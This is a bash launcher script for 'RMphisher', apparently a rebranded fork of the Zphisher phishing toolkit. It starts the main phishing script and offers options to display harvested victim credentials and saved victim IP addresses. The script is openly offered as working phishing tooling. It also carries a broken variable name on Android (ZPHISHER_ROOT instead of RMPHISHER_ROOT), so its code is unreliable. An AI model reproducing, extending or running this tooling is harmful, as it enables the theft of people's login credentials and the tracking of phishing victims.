#!/bin/bash

# https://github.com/Saikohackerteamrm/RMPHISHER

if [[ $(uname -o) == *'Android'* ]];then
	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/rmphisher"
else
	export RMPHISHER_ROOT="/opt/rmphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run RMphisher type \`Rmphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $RMPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $RMPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $RMPHISHER_ROOT
	bash ./rmphisher.sh
fi
